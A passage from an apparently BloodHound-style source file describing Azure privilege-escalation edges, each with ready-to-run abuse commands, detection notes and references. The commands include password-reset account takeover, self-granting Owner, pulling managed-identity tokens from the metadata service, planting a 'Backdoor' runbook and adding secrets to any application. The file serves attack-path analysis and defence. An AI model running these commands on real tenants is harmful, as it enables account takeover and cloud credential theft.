    kind: 'AZResetPassword',
    category: 'Azure Manipulation',
    general:
      'The AZResetPassword edge indicates that a principal can reset the password of a target Azure AD user. This capability is granted through directory roles such as User Administrator, Helpdesk Administrator, Password Administrator, Authentication Administrator, or Privileged Authentication Administrator. The scope varies by role: User Administrator can reset non-admin users and some admin roles, while Privileged Authentication Administrator can reset any user. Password reset is a direct account takeover vector.',
    windowsAbuse: `# Reset password using Azure AD PowerShell
Connect-AzureAD
Set-AzureADUserPassword -ObjectId <TargetUser-ObjectId> -Password (ConvertTo-SecureString "NewPassword123!" -AsPlainText -Force)

# Using Microsoft Graph PowerShell
Connect-MgGraph -Scopes "User.ReadWrite.All"
Update-MgUser -UserId <TargetUser-ObjectId> -PasswordProfile @{Password="NewPassword123!"; ForceChangePasswordNextSignIn=$false}`,
    linuxAbuse: `# Reset password using az CLI
az ad user update --id <TargetUser-ObjectId> --password "NewPassword123!"

# Using MS Graph API
curl -X PATCH "https://graph.microsoft.com/v1.0/users/<TargetUserId>" \\
  -H "Authorization: Bearer $token" \\
  -H "Content-Type: application/json" \\
  -d '{"passwordProfile": {"password": "NewPassword123!", "forceChangePasswordNextSignIn": false}}'`,
    opsec:
      'Password resets generate "Reset user password" or "Reset password (by admin)" events in Azure AD Audit Logs with the initiating principal clearly identified. Microsoft Sentinel detects admin password resets, especially targeting privileged accounts. MFA re-registration events following a password reset can indicate account takeover. Monitor for password resets during off-hours or targeting accounts that rarely have password resets.',
    references: [
      {
        title: 'Microsoft - Password Reset Permissions',
        url: 'https://learn.microsoft.com/en-us/entra/identity/role-based-access-control/privileged-roles-permissions#who-can-reset-passwords',
      },
      {
        title: 'BloodHound Documentation - AZResetPassword',
        url: 'https://support.bloodhoundenterprise.io/hc/en-us/articles/17323849904027-AZResetPassword',
      },
    ],
  },
  {
    kind: 'AZUserAccessAdministrator',
    category: 'Azure Manipulation',
    general:
      'The AZUserAccessAdministrator edge indicates that a principal has the User Access Administrator built-in RBAC role on an Azure resource scope. This role can manage role assignments (assign and remove any Azure RBAC role) but does not directly grant resource management capabilities. However, the ability to assign roles is extremely powerful — User Access Administrator can assign the Owner, Contributor, or any custom role to themselves or any other principal, effectively escalating to full resource control. At the subscription level, this provides control over all role assignments within the subscription.',
    windowsAbuse: `# Assign Contributor role to yourself
New-AzRoleAssignment -ObjectId <SelfObjectId> -RoleDefinitionName "Contributor" -Scope "/subscriptions/<SubscriptionId>"

# Or assign Owner
New-AzRoleAssignment -ObjectId <SelfObjectId> -RoleDefinitionName "Owner" -Scope "/subscriptions/<SubscriptionId>"

# Assign Key Vault access
New-AzRoleAssignment -ObjectId <SelfObjectId> -RoleDefinitionName "Key Vault Secrets User" -Scope "/subscriptions/<SubscriptionId>/resourceGroups/<RG>/providers/Microsoft.KeyVault/vaults/<VaultName>"`,
    linuxAbuse: `# Assign Contributor role to yourself
az role assignment create --role "Contributor" --assignee-object-id <SelfObjectId> --scope "/subscriptions/<SubscriptionId>"

# Assign Owner for full control
az role assignment create --role "Owner" --assignee-object-id <SelfObjectId> --scope "/subscriptions/<SubscriptionId>"

# Assign Key Vault data plane access
az role assignment create --role "Key Vault Secrets User" --assignee-object-id <SelfObjectId> --scope "/subscriptions/<SubscriptionId>/resourceGroups/<RG>/providers/Microsoft.KeyVault/vaults/<VaultName>"`,
    opsec:
      'Role assignment changes generate "Create role assignment" events in the Azure Activity Log with the assigner, assignee, role, and scope. Monitor for self-assignment patterns (same principal as assigner and assignee). Microsoft Sentinel has analytics rules for suspicious role assignments. Azure Policy deny effects can restrict which roles can be assigned. PIM can require just-in-time activation for User Access Administrator.',
    references: [
      {
        title: 'Microsoft - User Access Administrator Role',
        url: 'https://learn.microsoft.com/en-us/azure/role-based-access-control/built-in-roles#user-access-administrator',
      },
      {
        title: 'Microsoft - Azure RBAC',
        url: 'https://learn.microsoft.com/en-us/azure/role-based-access-control/overview',
      },
    ],
  },
  {
    kind: 'AZVMAdminLogin',
    category: 'Azure Manipulation',
    general:
      'The AZVMAdminLogin edge indicates that a principal has the Virtual Machine Administrator Login role on a VM or VM scope. This role allows logging into a Virtual Machine as an administrator via Azure AD authentication. On Linux VMs, this grants root-equivalent access; on Windows VMs, local administrator access. This role requires Azure AD authentication to be configured on the VM (via the AADLoginForWindows or AADSSHLoginForLinux VM extension).',
    windowsAbuse: `# RDP to a Windows VM with Azure AD auth
# Requires AADLoginForWindows extension on the VM
mstsc /v:<VM-IP>
# Use Azure AD credentials at the login prompt: AzureAD\\user@domain.com

# Or use az CLI for SSH on Linux
az ssh vm -n <VMName> -g <ResourceGroup>`,
    linuxAbuse: `# SSH to a Linux VM with Azure AD auth
az ssh vm -n <VMName> -g <ResourceGroup>

# Or SSH directly (requires AADSSHLoginForLinux extension)
ssh -l user@domain.com <VM-IP>

# After gaining access, extract managed identity tokens
curl -s -H "Metadata:true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"`,
    opsec:
      'Azure AD login to VMs is logged in Azure AD Sign-in Logs with the VM as the resource. The VM extension logs the authentication attempt. On the VM, standard logon events are generated (Windows Event ID 4624, Linux auth logs). Monitor for Azure AD logins to VMs from unexpected principals or unusual locations. Microsoft Defender for Cloud detects anomalous VM login patterns.',
    references: [
      {
        title: 'Microsoft - Azure AD VM Login',
        url: 'https://learn.microsoft.com/en-us/entra/identity/devices/howto-vm-sign-in-azure-ad-linux',
      },
      {
        title: 'Microsoft - VM Administrator Login Role',
        url: 'https://learn.microsoft.com/en-us/azure/role-based-access-control/built-in-roles#virtual-machine-administrator-login',
      },
    ],
  },
  {
    kind: 'AZVMContributor',
    category: 'Azure Manipulation',
    general:
      'The AZVMContributor edge indicates that a principal has the Virtual Machine Contributor role on a VM or VM scope. This role grants the ability to manage Virtual Machines, including creating, updating, deleting, starting, stopping, and — critically — running commands on VMs via the Run Command feature. VM Contributor provides command execution without requiring direct network access to the VM, making it a potent privilege even when the VM is on a private network.',
    abuse:
      'Execute commands via Run Command: az vm run-command invoke -g <RG> -n <VM> --command-id RunShellScript --scripts "id" (Linux) or --command-id RunPowerShellScript --scripts "whoami" (Windows). Commands run as SYSTEM/root. Extract managed identity tokens, harvest credentials, or deploy persistence mechanisms. VM Contributor can also manage VM extensions, enabling Custom Script Extension deployment for persistent code execution.',
    opsec:
      'VM Run Command generates "Run Command on Virtual Machine" events in the Azure Activity Log. Extension deployments generate "Create or Update Virtual Machine Extension" events. OS-level process creation events are generated for the executed commands. Microsoft Defender for Cloud and Microsoft Defender for Endpoint detect suspicious VM operations. Monitor for Run Command invocations from unexpected principals.',
    references: [
      {
        title: 'Microsoft - Virtual Machine Contributor Role',
        url: 'https://learn.microsoft.com/en-us/azure/role-based-access-control/built-in-roles#virtual-machine-contributor',
      },
      {
        title: 'Microsoft - VM Run Command',
        url: 'https://learn.microsoft.com/en-us/azure/virtual-machines/run-command-overview',
      },
    ],
  },
  {
    kind: 'AZWebsiteContributor',
    category: 'Azure Manipulation',
    general:
      'The AZWebsiteContributor edge indicates that a principal has the Website Contributor role on an App Service, Function App, or App Service Plan. This role can manage web apps and function apps, including deploying code, accessing application settings (which often contain secrets and connection strings), configuring continuous deployment, and accessing the Kudu/SCM console for direct command execution. If the app has a managed identity, the contributor can leverage it by deploying code that uses the identity.',
    windowsAbuse: `# Access application settings (may contain secrets)
Get-AzWebApp -ResourceGroupName <RG> -Name <AppName> | Select-Object -ExpandProperty SiteConfig | Select-Object -ExpandProperty AppSettings

# Deploy code via ZIP deploy
Publish-AzWebApp -ResourceGroupName <RG> -Name <AppName> -ArchivePath payload.zip

# Access Kudu console for command execution
# Navigate to https://<AppName>.scm.azurewebsites.net/DebugConsole`,
    linuxAbuse: `# List application settings (often contain DB connection strings, API keys)
az webapp config appsettings list -g <RG> -n <AppName>

# Deploy malicious code
az webapp deployment source config-zip -g <RG> -n <AppName> --src payload.zip

# Access Kudu console via API
az webapp ssh -g <RG> -n <AppName>

# Get publishing credentials
az webapp deployment list-publishing-profiles -g <RG> -n <AppName>

# Extract managed identity token from within the app
curl -s -H "X-IDENTITY-HEADER: $IDENTITY_HEADER" "$IDENTITY_ENDPOINT?api-version=2019-08-01&resource=https://management.azure.com/"`,
    opsec:
      'App Service deployments are logged in the Azure Activity Log. Application settings access and modification are logged. Kudu console access is logged in the SCM site logs. Monitor for unexpected deployments, application settings reads, and SSH/console access to App Services. Microsoft Defender for App Service detects suspicious activities. Publishing profile access should be monitored as it contains deployment credentials.',
    references: [
      {
        title: 'Microsoft - Website Contributor Role',
        url: 'https://learn.microsoft.com/en-us/azure/role-based-access-control/built-in-roles#website-contributor',
      },
      {
        title: 'Microsoft - App Service Security',
        url: 'https://learn.microsoft.com/en-us/azure/app-service/overview-security',
      },
    ],
  },
  {
    kind: 'AZAutomationContributor',
    category: 'Azure Manipulation',
    general:
      'The AZAutomationContributor edge indicates that a principal has the Automation Contributor role (or Contributor on an Automation Account). Azure Automation accounts can run PowerShell and Python runbooks, which execute with the permissions of the Automation Account Run As account or managed identity. Automation Contributor can create, modify, and execute runbooks, access Automation credentials and variables (which often contain privileged credentials), and import modules. If the Automation Account has a Run As account with Contributor on the subscription, runbook execution provides subscription-level access.',
    windowsAbuse: `# List Automation Account credentials and variables (may contain secrets)
Get-AzAutomationVariable -ResourceGroupName <RG> -AutomationAccountName <Account>
Get-AzAutomationCredential -ResourceGroupName <RG> -AutomationAccountName <Account>

# Create and run a malicious runbook
$runbookContent = 'Get-AzContext; Get-AzKeyVaultSecret -VaultName <vault>'
Set-Content -Path runbook.ps1 -Value $runbookContent
Import-AzAutomationRunbook -ResourceGroupName <RG> -AutomationAccountName <Account> -Name "Backdoor" -Type PowerShell -Path runbook.ps1
Publish-AzAutomationRunbook -ResourceGroupName <RG> -AutomationAccountName <Account> -Name "Backdoor"
Start-AzAutomationRunbook -ResourceGroupName <RG> -AutomationAccountName <Account> -Name "Backdoor"`,
    linuxAbuse: `# List Automation Account variables
az automation variable list --resource-group <RG> --automation-account-name <Account>

# Get Run As connection details
az automation connection list --resource-group <RG> --automation-account-name <Account>

# Create and execute a runbook
az automation runbook create -g <RG> --automation-account-name <Account> -n "Backdoor" --type PowerShell
# Upload content and publish, then start
az automation runbook start -g <RG> --automation-account-name <Account> -n "Backdoor"`,
    opsec:
      'Runbook creation, modification, and execution are logged in the Azure Activity Log. Automation Account job output and streams are logged in Automation Account logs. Monitor for new runbook creation, especially by principals who do not normally manage automation. Microsoft Sentinel can correlate Automation Account activity with subsequent privileged API calls. Monitor for credential and variable access, which may indicate secret extraction.',
    references: [
      {
        title: 'Microsoft - Automation Contributor Role',
        url: 'https://learn.microsoft.com/en-us/azure/role-based-access-control/built-in-roles#automation-contributor',
      },
      {
        title: 'Microsoft - Automation Security',
        url: 'https://learn.microsoft.com/en-us/azure/automation/automation-security-overview',
      },
    ],
  },
  {
    kind: 'AZCloudAppAdmin',
    category: 'Azure Manipulation',
    general:
      'The AZCloudAppAdmin edge indicates that a principal holds the Cloud Application Administrator directory role. This role can manage all aspects of enterprise applications and application registrations (except App Proxy). Cloud Application Administrators can add credentials to any application, modify application permissions, manage consent settings, and configure single sign-on. This is effectively application-level Global Admin — the role can take over any application by adding credentials, then authenticate as that application to use its permissions.',
    abuse:
      'Add a secret to any application in the tenant: az ad app credential reset --id <AppId> --append. Then authenticate as that application using the client credentials flow. If the target application has privileged MS Graph permissions (Directory.ReadWrite.All, RoleManagement.ReadWrite.Directory), this provides a path to tenant compromise. Cloud Application Administrator can also consent to API permissions for applications.',
    opsec:
      'Credential additions and permission changes generate Azure AD Audit Log events. Monitor for "Update application - Certificates and secrets management" events initiated by Cloud Application Administrators targeting applications they do not normally manage. Microsoft Defender for Cloud Apps detects suspicious application modifications. PIM can require just-in-time activation for this role.',
    references: [
      {
        title: 'Microsoft - Cloud Application Administrator',
        url: 'https://learn.microsoft.com/en-us/entra/identity/role-based-access-control/permissions-reference#cloud-application-administrator',
      },
      {
        title: 'SpecterOps - Azure Application Abuse',
        url: 'https://posts.specterops.io/azure-privilege-escalation-via-azure-api-permissions-abuse-74aee1006f48',
      },
    ],
  },
  {
    kind: 'AZAppAdmin',
    category: 'Azure Manipulation',
    general:
      'The AZAppAdmin edge indicates that a principal holds the Application Administrator directory role. This role has all the capabilities of Cloud Application Administrator plus the ability to manage Application Proxy settings. Application Administrators can add credentials to any application, modify permissions, configure SSO, and manage consent. Like Cloud Application Administrator, this role enables application takeover by adding credentials, but with the additional capability of managing on-premises application access through App Proxy.',
    abuse:
      'Identical to Cloud Application Administrator abuse: add credentials to any application, authenticate as that application, and leverage its permissions. Additionally, Application Administrators can modify App Proxy configurations, potentially redirecting on-premises application traffic through attacker-controlled connectors. Use az ad app credential reset --id <AppId> --append to add credentials.',
    opsec:
      'Same monitoring as Cloud Application Administrator. Additionally, monitor for App Proxy configuration changes, connector registration, and redirect URI modifications. Azure AD Audit Logs capture all application management activities. PIM should be used for this role with MFA and approval requirements.',
    references: [
      {
        title: 'Microsoft - Application Administrator',
        url: 'https://learn.microsoft.com/en-us/entra/identity/role-based-access-control/permissions-reference#application-administrator',
      },
      {
        title: 'Microsoft - App Proxy Security',
        url: 'https://learn.microsoft.com/en-us/entra/identity/app-proxy/application-proxy-security',
      },
    ],
  },
];
